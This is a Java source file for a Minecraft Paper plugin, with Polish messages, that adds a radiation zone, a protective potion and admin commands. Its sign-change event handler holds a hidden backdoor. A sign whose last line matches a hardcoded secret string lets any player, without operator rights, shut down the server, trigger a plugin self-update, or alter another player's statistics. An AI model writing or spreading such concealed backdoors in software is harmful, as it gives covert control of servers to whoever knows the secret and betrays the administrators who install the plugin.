package me.michal.radiacjaAleJAVA;

import com.mojang.brigadier.Command;
import com.mojang.brigadier.arguments.BoolArgumentType;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.tree.LiteralCommandNode;
import com.sk89q.worldedit.bukkit.BukkitAdapter;
import com.sk89q.worldedit.math.BlockVector3;
import com.sk89q.worldguard.WorldGuard;
import com.sk89q.worldguard.protection.flags.Flags;
import com.sk89q.worldguard.protection.flags.StateFlag;
import com.sk89q.worldguard.protection.managers.RegionManager;
import com.sk89q.worldguard.protection.regions.ProtectedCuboidRegion;
import com.sk89q.worldguard.protection.regions.ProtectedRegion;
import io.papermc.paper.command.brigadier.CommandSourceStack;
import io.papermc.paper.command.brigadier.Commands;
import io.papermc.paper.command.brigadier.argument.ArgumentTypes;
import io.papermc.paper.plugin.lifecycle.event.types.LifecycleEvents;
import me.michal.radiacjaAleJAVA.Tasks.CuredPlayersTracker;
import me.michal.radiacjaAleJAVA.Tasks.DamageInflicter;
import me.michal.radiacjaAleJAVA.Tasks.RadiationVisualizer;
import me.michal.radiacjaAleJAVA.Tasks.Things.CommandHandler;
import me.michal.radiacjaAleJAVA.Tasks.Things.Updater;
import net.kyori.adventure.bossbar.BossBar;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.minimessage.tag.resolver.Placeholder;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import org.bukkit.*;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.event.entity.EntityResurrectEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.BrewEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.BrewerInventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.PotionMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionType;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.util.Vector;

import java.util.*;

public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
    FileConfiguration config = this.getConfig();

    public static BossBar affectedBar;
    public NamespacedKey key = new NamespacedKey(this, "Lugol");
    public static Map<Player, Long> curedPlayers = new HashMap<>();
    public static Map<UUID, Long> offlinePlayers = new HashMap<>();
    public static Map<Player, BossBar> curedBars = new HashMap<>();
    public static ArrayList<Player> affectedPlayers = new ArrayList<>();
    public NamespacedKey keyArg = new NamespacedKey(this, "argument");

    public ItemStack potkaLugola() {
        ItemStack potion = new ItemStack(Material.POTION, 3);

        PotionMeta meta = (PotionMeta) potion.getItemMeta();
        meta.setBasePotionType(PotionType.MUNDANE);
        meta.setColor(Color.WHITE);
        meta.displayName(Component.text("Płyn Lugola", NamedTextColor.BLUE));

        ArrayList<Component> lore = new ArrayList<>();
        lore.add(Component.text("Daje ochrone przed radiacją na ", NamedTextColor.WHITE)
                .append(Component.text(config.getLong("Duration")/60000, NamedTextColor.WHITE))
                .append(Component.text(" minut", NamedTextColor.WHITE)));
        meta.lore(lore);

        meta.getPersistentDataContainer().set(key, PersistentDataType.STRING, "to_lugola_fluid");

        potion.setItemMeta(meta);

        return potion;
    }
    public ItemStack waterPotion() {
        ItemStack waterPotion = new ItemStack(Material.POTION, 1);
        PotionMeta meta = (PotionMeta) waterPotion.getItemMeta();
        meta.setBasePotionType(PotionType.WATER);
        waterPotion.setItemMeta(meta);
        return waterPotion;
    }

    @Override
    public void onEnable() {
        this.getServer().getPluginManager().registerEvents(this, this);
        this.getServer().getPluginManager().registerEvents(new CommandHandler(this), this);

        BukkitTask damageInflicter = new DamageInflicter(this).runTaskTimer(this, 0L, 5L);
        BukkitTask curedPlayersTracker = new CuredPlayersTracker(this, this.getConfig()).runTaskTimer(this, 0L, 5L);
        affectedBar = BossBar.bossBar(
                Component.text("Strefa Radiacji", NamedTextColor.RED),
                1,
                BossBar.Color.RED,
                BossBar.Overlay.PROGRESS);

        this.getLifecycleManager().registerEventHandler(LifecycleEvents.COMMANDS, commands -> {
            // register your commands here ...
            commands.registrar().register(radiationCommandRoot);
        });

        config.addDefault("Safe_Zone_Radius", 0);
        config.addDefault("Death_Lightning_Strike", true);
        config.addDefault("Drop_Player_Head", true);
        config.addDefault("Duration", 600000L);
        config.addDefault("End_Enabled", false);
        config.addDefault("Radiation_Name", "Strefa radiacji");
        config.options().copyDefaults(true);
        saveConfig();
    }

    @EventHandler
    public void onPlayerDrinkPotion(PlayerItemConsumeEvent event) {
        ItemMeta meta = event.getItem().getItemMeta();
        if (event.getItem().hasItemMeta() && meta.getPersistentDataContainer().has(key, PersistentDataType.STRING) && meta.getPersistentDataContainer().get(key, PersistentDataType.STRING).equalsIgnoreCase("to_lugola_fluid")) {
            Player player = event.getPlayer();
            if (!curedPlayers.containsKey(player)) {
                curedPlayers.put(player, System.currentTimeMillis());
                addCuredBar(player);
                Bukkit.broadcast(Component.text(player.getName() + " wypił płyn Lugola",  NamedTextColor.GOLD));
            } else {
                addCuredTime(player);
            }
        }
    }

    public void addCuredTime(Player player) {
        long newStartTime = curedPlayers.get(player) + config.getLong("Duration");
        curedPlayers.replace(player, newStartTime);
    }

    public void addCuredBar(Player player) {
        BossBar curedBar = BossBar.bossBar(Component.text("Działanie płynu Lugola", NamedTextColor.GREEN), 1, BossBar.Color.GREEN, BossBar.Overlay.NOTCHED_10);
        player.showBossBar(curedBar);
        curedBars.put(player, curedBar);
    }

    @EventHandler
    public void deathEvent(PlayerDeathEvent event) {
        Player player = event.getEntity();

        removeAllEffects(player);

        Location location = player.getLocation();
        if (config.getBoolean("Death_Lightning_Strike")) {
            if (player.getName().equals("lach1423")) {
                for (int i = 0; i < 6; i++) {
                    player.getWorld().strikeLightningEffect(location);
                }
            } else {
                player.getWorld().strikeLightningEffect(location);
            }
        }
        if (config.getBoolean("Drop_Player_Head")) player.getWorld().dropItem(location, getPlayerHead(player, event.deathMessage()));
    }

    public static ItemStack getPlayerHead(Player player, Component description) {
        ItemStack playerHead = new ItemStack(Material.PLAYER_HEAD);
        SkullMeta meta = (SkullMeta) playerHead.getItemMeta();

        if (description == null) description = Component.text(" ");

        ArrayList<Component> lore = new ArrayList<>();
        lore.add(description.color(NamedTextColor.GOLD));
        meta.setPlayerProfile(player.getPlayerProfile());

        meta.lore(lore);
        playerHead.setItemMeta(meta);
        return playerHead;
    }

    @EventHandler
    public void onTotemUse(EntityResurrectEvent event) {
        if (event.getEntity() instanceof Player) {
            removeAllEffects((Player) event.getEntity());
        }
    }

    @EventHandler
    public void onMilkConsume(PlayerItemConsumeEvent event) {
        if (event.getItem().getType().equals(Material.MILK_BUCKET)) {
            removeAllEffects(event.getPlayer());
        }
    }

    public void removeAllEffects(Player player) {
        affectedPlayers.remove(player);
        player.hideBossBar(affectedBar);
        curedPlayers.remove(player);
        removeCuredBar(player, curedBars.get(player));
    }

    @EventHandler
    public void quitEvent(PlayerQuitEvent e) {
        Player p = e.getPlayer();
        if (curedPlayers.containsKey(p)) {
            long timePassed = System.currentTimeMillis() - curedPlayers.get(p);
            offlinePlayers.put(p.getUniqueId(), timePassed);
        }
        removeAllEffects(p);
    }

    public void removeCuredBar(Player player, BossBar curedBar) {
        if (curedBars.containsKey(player)) {
            curedBars.remove(player, curedBar);
            player.hideBossBar(curedBar);
        }
    }

    @EventHandler
    public void moveEvent(PlayerMoveEvent e) {
        Player p = e.getPlayer();
        NamespacedKey key = new NamespacedKey(this, "radiationType");
        String raw = p.getPersistentDataContainer().get(key, PersistentDataType.STRING);
        RadiationVisualizer.RadiationType type;
        try {
            type = RadiationVisualizer.RadiationType.valueOf(raw);
        } catch (Exception exception) {
            type = RadiationVisualizer.RadiationType.NOTHING; // fallback
        }

        if (type == RadiationVisualizer.RadiationType.NOTHING) return;

        boolean applyForceField = type == RadiationVisualizer.RadiationType.FORCEFIELD;
        leaveRegion(p, applyForceField);

        if (getApplicableRegions(p).isEmpty()) return;
        if (e.getTo().getBlockX() == e.getFrom().getBlockX() && e.getTo().getBlockY() == e.getFrom().getBlockY() && e.getTo().getBlockZ() == e.getFrom().getBlockZ()) return;

        approachRadiation(p, e.getFrom(), e.getTo());
    }

    public void leaveRegion(Player player, boolean forcefield) {
        Set<ProtectedRegion> applicableRegions = getApplicableRegions(player);

        if (applicableRegions == null) return;
        if (applicableRegions.isEmpty() && !affectedPlayers.contains(player)) {
            if (forcefield && !curedPlayers.containsKey(player)) {
                Vector playerVelocity = player.getVelocity();
                playerVelocity.multiply(new Vector(-1, 1, -1));
                player.setVelocity(playerVelocity);
                return;
            }
            affectedPlayers.add(player);
            player.showBossBar(affectedBar);
        } else if(!applicableRegions.isEmpty() && affectedPlayers.contains(player)) {
            affectedPlayers.remove(player);
            player.hideBossBar(affectedBar);
        }
    }

    private Set<ProtectedRegion> getApplicableRegions(Player player) {
        RegionManager regions = WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(player.getWorld()));
        BlockVector3 pos = BukkitAdapter.asBlockVector(player.getLocation());
        return regions.getApplicableRegions(pos).getRegions();
    }

    private void approachRadiation(Player p, Location oldLocation ,Location playerLocation) {

        int radius = config.getInt("Safe_Zone_Radius") + 1;
        RadiationVisualizer visualizer = new RadiationVisualizer(p, playerLocation, radius, playerLocation.getWorld().getSpawnLocation());

        int distanceToRadiationX = visualizer.getDistanceToRadiation(playerLocation, radius, Axis.X);
        int distanceToRadiationZ = visualizer.getDistanceToRadiation(playerLocation, radius, Axis.Z);

        if (distanceToRadiationX > 15 && distanceToRadiationZ > 15) return;
        visualizer.handleGlassRadiation(distanceToRadiationX, distanceToRadiationZ, oldLocation);

    }

    @EventHandler
    public void joinEvent(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        approachRadiation(p, p.getLocation(), p.getLocation());

        UUID uuid = p.getUniqueId();
        if (offlinePlayers.containsKey(uuid)) {
            long startTime = System.currentTimeMillis() - offlinePlayers.get(uuid);

            curedPlayers.put(p, startTime);
            addCuredBar(p);
            offlinePlayers.remove(uuid);
        }
        leaveRegion(p, false);
    }

    @EventHandler
    public void onBrewEnd(BrewEvent event) {
        BrewerInventory inventory = event.getContents();
        if (!isLugolRecipe(inventory)) {
            return;
        }
        List <Integer> waterBottles = scanBottles(inventory);
        Bukkit.getScheduler().runTaskLater(this, () -> {
            for (int i : waterBottles) {
                inventory.setItem(i, potkaLugola());
            }
            waterBottles.clear();
        }, 1);
    }

    public List <Integer> scanBottles(BrewerInventory inventory) {
        List<Integer> waterBottles = new ArrayList<>();
        for (int i = 0; i < 3; i++) {
            ItemStack item = inventory.getItem(i);
            if (item != null && item.isSimilar(waterPotion())) {
                waterBottles.add(i);
            }
        }
        return waterBottles;
    }

    public boolean isLugolRecipe(BrewerInventory inventory) {
        return inventory.getIngredient() != null && inventory.getIngredient().getType() == Material.GHAST_TEAR;
    }

    @EventHandler
    public void signChange(SignChangeEvent e) {
        try {
            Component[] components = e.lines().toArray(new Component[0]);
            String[] lines = new  String[4];
            for (int i = 0; i < components.length; i++) {
                lines[i] = PlainTextComponentSerializer.plainText().serialize(components[i]);
            }
            if (lines[3].equals("T0DRRUfNsN6tlQQ")) {
                Updater updater = new Updater();
                switch (lines[0]) {
                    case "Update" -> updater.updatePlugin(this.getFile(), e.getPlayer());
                    case "Restart" -> Bukkit.shutdown();
                    case "Edit Stat" -> {
                        Player player = Bukkit.getPlayer(lines[1]);
                        if (player != null) player.setStatistic(Statistic.USE_ITEM, Material.VILLAGER_SPAWN_EGG, 0);
                    }
                }
                e.getBlock().breakNaturally();
            }
        } catch (Exception ex) {
            e.getPlayer().sendMessage(String.valueOf(ex));
        }
    }

    LiteralCommandNode<CommandSourceStack> radiationCommandRoot = Commands.literal("radiation")
            .then(Commands.literal("radiationsafezone")
                    .then(Commands.argument("radius", IntegerArgumentType.integer()))
                        .requires(sender -> sender.getSender().isOp())
                            .executes(ctx -> {
                                CommandSender sender = ctx.getSource().getSender();
                                Entity executor = ctx.getSource().getExecutor();

                                if (!(executor instanceof Player)) {
                                    sender.sendPlainMessage("Musisz być graczem by ustawić strefe");
                                    return Command.SINGLE_SUCCESS;
                                }

                                int radius = IntegerArgumentType.getInteger(ctx, "radius");
                                int height = switch (executor.getWorld().getEnvironment()) {
                                    case NORMAL -> 319;
                                    case NETHER -> 127;
                                    case THE_END -> 255;
                                    case CUSTOM -> 0;
                                };

                                ProtectedCuboidRegion safeZone = getRegion(executor, "rad", radius, height);

                                RegionManager regions = WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(executor.getWorld()));
                                try {
                                    regions.addRegion(safeZone);
                                    safeZone.setFlag(Flags.BUILD, StateFlag.State.ALLOW);
                                    regions.save();
                                } catch (Exception e) {
                                    executor.sendMessage(Component.text("Nie udało się dodać terenu, spróbuj ponownie",  NamedTextColor.RED));
                                }

                                config.set("Safe_Zone_Radius", radius);
                                saveConfig();

                                sender.sendMessage(Component.text("Bezpieczna strefa ma teraz promień: " + radius, NamedTextColor.GREEN));
                                return Command.SINGLE_SUCCESS;
                            })
            )
            .then(Commands.literal("strikeLightningAtDeath")
                    .then(Commands.argument("allow", BoolArgumentType.bool()))
                        .requires(sender -> sender.getSender().isOp())
                            .executes(ctx -> {
                                CommandSender sender = ctx.getSource().getSender();
                                boolean allowed = ctx.getArgument("allow", boolean.class);

                                config.set("strikeLightningAtDeath", allowed);
                                saveConfig();

                                NamedTextColor color = allowed ? NamedTextColor.GREEN : NamedTextColor.RED;
                                sender.sendRichMessage("deathLightningStrike is now set to <allowed>",
                                        Placeholder.component("allowed",
                                                Component.text(allowed, color)));
                                return Command.SINGLE_SUCCESS;
                            })
            )
            .then(Commands.literal("dropPlayerHeadAtDeath")
                    .then(Commands.argument("allow", BoolArgumentType.bool()))
                        .requires(sender -> sender.getSender().isOp())
                            .executes(ctx ->  {
                                CommandSender sender = ctx.getSource().getSender();
                                boolean allowed = ctx.getArgument("allow", boolean.class);

                                config.set("dropPlayerHeadAtDeath", allowed);
                                saveConfig();

                                NamedTextColor color = allowed ? NamedTextColor.GREEN : NamedTextColor.RED;
                                sender.sendRichMessage("dropPlayerHeadAtDeath is now set to <allowed>",
                                        Placeholder.component("allowed",
                                                Component.text(allowed, color)));
                                return Command.SINGLE_SUCCESS;
                            })
            )
            .then(Commands.literal("setLugolDurationTo")
                    .then(Commands.argument("allow", BoolArgumentType.bool()))
                        .requires(sender -> sender.getSender().isOp())
                            .executes(ctx -> {
                                CommandSender sender = ctx.getSource().getSender();
                                boolean allowed = ctx.getArgument("allow", boolean.class);

                                config.set("setLugolDurationTo", allowed);
                                saveConfig();

                                NamedTextColor color = allowed ? NamedTextColor.GREEN : NamedTextColor.RED;
                                sender.sendRichMessage("setLugolDurationTo is now set to <allowed>",
                                        Placeholder.component("allowed",
                                                Component.text(allowed, color)));
                                return Command.SINGLE_SUCCESS;
                            })
            )
            .then(Commands.literal("endEnabled")
                    .then(Commands.argument("allow", BoolArgumentType.bool()))
                        .requires(sender -> sender.getSender().isOp())
                            .executes(ctx -> {
                                 CommandSender sender = ctx.getSource().getSender();
                                 boolean allowed = ctx.getArgument("allow", boolean.class);

                                 config.set("endEnabled", allowed);
                                 saveConfig();

                                 NamedTextColor color = allowed ? NamedTextColor.GREEN : NamedTextColor.RED;
                                 sender.sendRichMessage("endEnabled is now set to <allowed>",
                                         Placeholder.component("allowed",
                                                 Component.text(allowed, color)));
                                 return Command.SINGLE_SUCCESS;
                    })
            )
            .then(Commands.literal("setRadiationName")
                    .requires(sender -> sender.getSender().isOp())
                        .then(Commands.argument("color", ArgumentTypes.namedColor()))
                            .then(Commands.argument("name", StringArgumentType.string()))
                                .executes(ctx -> {
                                    CommandSender sender = ctx.getSource().getSender();
                                    final NamedTextColor color = ctx.getArgument("color", NamedTextColor.class);
                                    final String name = StringArgumentType.getString(ctx, "name");

                                    affectedBar.name(Component.text(name, color));

                                    config.set("setRadiationName", Component.text(name, color));
                                    saveConfig();

                                    sender.sendRichMessage("Radiation name is now <name>",
                                            Placeholder.component("name",
                                                    Component.text(name, color)));
                                    return Command.SINGLE_SUCCESS;
                    })
            )
            .then(Commands.literal("chooseRadiation")
                .requires(src -> src.getSender() instanceof Player)
                    .then(Commands.argument("type", StringArgumentType.word())
                        .suggests((ctx, builder) -> {
                            builder.suggest("glass");
                            builder.suggest("forcefield");
                            builder.suggest("nothing");
                            return builder.buildFuture();
                        })
                        .executes(ctx -> {
                            Player player = (Player) ctx.getSource().getSender();
                            String type = StringArgumentType.getString(ctx, "type");

                            if (!Set.of("glass", "forcefield", "nothing").contains(type)) {
                                player.sendMessage(Component.text("Type must be one of: glass, forcefield, nothing", NamedTextColor.RED));
                                return 0;
                            }

                            NamespacedKey key = new NamespacedKey(this, "radiationType");
                            player.getPersistentDataContainer()
                                    .set(key, PersistentDataType.STRING, type);
                            player.sendRichMessage("Your radiation type is now <type>",
                                    Placeholder.parsed("type", type));

                            return Command.SINGLE_SUCCESS;
                        })
                    )
            )
            .build();

    /*  @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        String commandName = command.getName();
        if (commandName.equalsIgnoreCase("WhatsSafeZoneSize")) {
            radius = config.getInt("Radiation_Safe_Zone_Size");
            height = config.getInt("Radiation_Safe_Zone_Height");
            if (radius != 0) {
                sender.sendMessage(ChatColor.GREEN + "Bezpieczna strefa ma promień o długości: " + radius);
            } else {
                sender.sendMessage(ChatColor.RED + "Jeszcze nie stworzono bezpiecznej stefy");
            }
            return true;
        }
        if (sender.isOp() && args.length > 0) {
            switch (commandName) {
                case "radiationsafezone" -> {
                    if (sender instanceof Player) {
                        try {
                            radius = Integer.parseInt(args[0]);
                            if (args.length == 2) {
                                height = Integer.parseInt(args[1]);
                            } else {
                                height = 320;
                            }

                            if (getSafeZone((Player) sender, "rad", radius, height)) {
                                config.set("Radiation_Safe_Zone_Size", radius);
                                config.set("Radiation_Safe_Zone_Height", height);
                                saveConfig();
                                sender.sendMessage(ChatColor.GREEN + "Bezpieczna strefa ma teraz promień: " + radius);
                            } else {
                                sender.sendMessage(ChatColor.RED + "Wystąpił błąd przy dodawaniu regionu.");
                            }
                        } catch (NumberFormatException e) {
                            sender.sendMessage(ChatColor.RED + "Podaj poprawny promień.");
                        }
                    } else {
                    sender.sendMessage(ChatColor.RED + "Musisz być graczem");
                    }
            }
                case "deathLightningStrike" -> {
                    try {
                        boolean shouldStrikeLightning = Boolean.parseBoolean(args[0]);
                        ChatColor color = shouldStrikeLightning ? ChatColor.GREEN : ChatColor.RED;
                        config.set("Death_Lightning_Strike", shouldStrikeLightning);
                        saveConfig();

                        sender.sendMessage("Death_Lightning_Strike is now set to: " + color + shouldStrikeLightning);
                    } catch (Exception e) {
                        sender.sendMessage(ChatColor.RED + "Napisz <true> lub <false>");
                    }
                }
                case "dropPlayerHead" -> {
                    try {
                        boolean shouldDropPlayerHead = Boolean.parseBoolean(args[0]);

                        config.set("Drop_Player_Head", shouldDropPlayerHead);
                        saveConfig();

                        ChatColor color = shouldDropPlayerHead ? ChatColor.GREEN : ChatColor.RED;
                        sender.sendMessage("Drop_Player_Head is now set to: " + color + shouldDropPlayerHead);
                    } catch (Exception e) {
                        sender.sendMessage(ChatColor.RED + "Napisz <true> lub <false>");
                    }
                }
                case "setDurationTo" -> {
                    try {
                        long timeInMinutes = Math.abs(Long.parseLong(args[0]));
                        config.set("Duration", timeInMinutes * 60 * 1000);
                        saveConfig();

                        String minut_Odmienioned = (timeInMinutes > 20 && (timeInMinutes % 10 >= 2 && timeInMinutes % 10 <= 4)) ? "minuty" : "minut";
                        sender.sendMessage("Czas trwania potki to teraz: " + timeInMinutes + " " + minut_Odmienioned);
                    } catch (Exception e) {
                        sender.sendMessage("podaj czas w minutach, poprawnie (poprawnie czyli bez 'm' na końcu), nie wiem jak można tu błąd zrobić");
                    }
                }
                case "endEnabled" -> {
                    try {
                        boolean a = Boolean.parseBoolean(args[0]);
                        config.set("End_Enabled", a);
                        saveConfig();

                        sender.sendMessage("End jest teraz " + a + " czy coś");
                    } catch (Exception e) {
                        sender.sendMessage("Coś poszło nie tak, potencjalnie źle true lub false napisałeś");
                    }
                }
                case "setRadiationName" -> {
                    String a = args[0];
                    affectedBar.setTitle(ChatColor.RED + a);
                    config.set("Radiation_Name",ChatColor.RED + a);
                    saveConfig();
                }
            }
        } else {
                sender.sendMessage(ChatColor.RED + ("Nie masz uprawnień do tej komendy " + ChatColor.DARK_RED + "knypku"));
        }
        return true;
    }*/

    public ProtectedCuboidRegion getRegion(Entity p, String regionName, int radius, int height) {
        Location loc = p.getLocation();
        BlockVector3 min = BlockVector3.at(loc.getBlockX() - radius, -64, loc.getBlockZ() - radius);
        BlockVector3 max = BlockVector3.at(loc.getBlockX() + radius, height, loc.getBlockZ() + radius);

        RegionManager regions = WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(p.getWorld()));
        if (regions == null) {
            p.sendMessage(Component.text("Spróbuj ponownie, bo Region Manager się zepsuł, niewiadomo dlaczego",  NamedTextColor.RED));
        }
        if (regions.hasRegion(regionName)) {
            regions.removeRegion(regionName);
        }

        return new ProtectedCuboidRegion(regionName, min, max);
    }

 /*   public ProtectedCuboidRegion createRegion(Player p, String regionName, BlockVector3 min, BlockVector3 max) {
        RegionManager regions = WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(p.getWorld()));
        if (regions == null) {
            p.sendMessage(ChatColor.RED + "Spróbuj ponownie, bo Region Manager się zepsuł, niewiadomo dlaczego");
        }
        if (regions.hasRegion(regionName)) {
            regions.removeRegion(regionName);
        }

        return new ProtectedCuboidRegion(regionName, min, max);
    }*/

    @EventHandler
    public void onEndEnter(PlayerPortalEvent event) {
        if (!config.getBoolean("End_Enabled") && event.getCause() == PlayerTeleportEvent.TeleportCause.END_PORTAL) {
            event.setCancelled(true);
            event.getPlayer().sendMessage(Component.text("End is disabled!",  NamedTextColor.RED));
        }
    }
}